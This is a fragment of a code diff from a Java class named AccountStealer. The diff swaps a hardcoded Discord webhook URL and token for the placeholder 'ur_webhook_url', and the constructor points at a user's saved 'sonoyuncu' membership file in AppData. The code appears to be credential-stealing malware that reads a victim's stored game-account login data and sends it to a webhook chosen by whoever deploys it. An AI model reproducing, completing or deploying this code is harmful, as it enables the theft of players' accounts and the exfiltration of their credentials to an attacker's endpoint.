@@ -29,7 +29,7 @@ public class AccountStealer {
 	{
 		username = new String("empty");
 		password = new String("empty");
-		webhookURL = new String("https://canary.discord.com/api/webhooks/1068219201170444308/GlcFuk2tRxpsYkkygzqCxU6EYv4mZZrnXBc6Ch9iLqKsV-Iee2kMCwimOxTQhTL3ioPF");
+		webhookURL = new String("ur_webhook_url");
 		membershipPath = new String(String.format("C:/Users/%s/Appdata/Roaming/.sonoyuncu/sonoyuncu-membership.json", System.getProperty("user.name")));
 	};
 	
